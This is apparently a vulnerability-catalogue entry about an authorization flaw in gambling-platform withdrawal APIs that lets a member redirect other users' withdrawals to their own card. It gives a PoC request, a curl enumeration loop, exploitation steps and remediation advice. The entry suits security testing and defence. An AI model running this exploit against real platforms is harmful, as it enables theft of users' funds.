---
title: Unauthorized withdrawal bank-card replacement (redirect others' withdrawals to your own card)
cve: None (business logic)
severity: critical
cvss: 9.3
product: Custom withdrawal modules (turnkey gambling platforms)
versions: Any
ports: 80, 443
keywords: withdrawal, bank card, authorization bypass, replacement, funds, withdraw
entry: bankId / cardNo / memberId in /api/withdraw/apply
verified: false
sources: Compiled from public sources (business logic flaws; no CVE)
---

## Fingerprints

```
POST /api/withdraw/apply  {"amount":100,"bankId":12}
GET  /api/bank/list       → My bank cards
```

## Prerequisites

- An ordinary member; ability to capture withdrawal-application requests.

## PoC

```http
### 1) Change bankId to point to another person's card
POST /api/withdraw/apply HTTP/1.1
Authorization: Bearer <token>

{"amount":10,"bankId":<enumerated-value>,"cardNo":"<your-own-card>","memberId":<other-user-uid>}
```

```bash
# 2) Iterate and inspect returned responses for acceptance (read-only assessment)
for b in $(seq 1 30); do
  r=$(curl -s -X POST https://target/api/withdraw/apply -H "Authorization: Bearer <t>" \
      -H 'Content-Type: application/json' -d "{\"amount\":1,\"bankId\":$b}")
  echo "$b → $(echo $r | head -c 80)"
done
# Confirmation: "card ending xxxx" appears and is not your own card
```

## Exploitation Steps

1. First bind your own card as a baseline;
2. Change bankId/memberId and request a 1-yuan withdrawal; inspect the recipient card's last digits in the response;
3. If another person's card appears → funds can be hijacked (critical);
4. Evidence: one request + card-ending digits in the response (redacted).

## Remediation and Mitigation

- Retrieve withdrawal cards only from records belonging to the token owner; verify bankId ownership;
- Require secondary verification (SMS/2FA) + a cooling-off period for withdrawal requests and bank-card changes.

## References

- OWASP WSTG-BUSL-01; CWE-639.
